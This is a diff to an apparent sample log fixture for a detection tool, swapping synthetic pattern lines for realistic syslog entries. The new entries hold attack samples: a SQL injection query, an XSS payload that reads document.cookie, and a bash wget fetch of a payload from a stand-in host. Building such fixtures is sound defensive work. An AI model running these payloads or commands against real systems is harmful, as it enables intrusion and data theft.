@@ -1,12 +1,8 @@
-FAILFAILLOGIN user attempted login
-INVALIDFAILACCESSACCESS system blocked access
-SELECTSELECTFROM table read attempt
-UPDATEWHEREWHERE admin forced update
-INSERTSELECTFROMFROM multi command sequence
-WARNWARNABCDERROR pattern detected
-ERRORABCDABCDWARN multi warning
-ABCD standalone pattern observed
-WARNERRORERROR unusual alert sequence
-random line that matches nothing
-aabcd
-xyxyabbc
+Jul 27 01:15:02 auth-server sshd[1402]: Failed password for root from 192.168.1.105 port 44210 ssh2
+Jul 27 01:15:05 auth-server sshd[1405]: Invalid user admin from 10.0.0.45 port 51234
+Jul 27 01:16:12 web-api nginx[8812]: GET /search?q=UNION SELECT FROM users WHERE 1=1 HTTP/1.1 200
+Jul 27 01:17:45 web-api nginx[8814]: POST /comment payload=<script>alert(document.cookie)</script> HTTP/1.1 400
+Jul 27 01:18:22 edge-gw app[9921]: Executing command /bin/bash -c wget http://malware.bad/payload.sh
+Jul 27 01:19:01 edge-gw app[9925]: User-Agent: Nikto/2.1.6 Scanner Test probe active
+Jul 27 01:20:10 kernel-srv kernel: [ 4521.102] Kernel panic - out_of_memory killer invoked
+Jul 27 01:21:00 sys-daemon systemd[1]: Normal operational status message ok
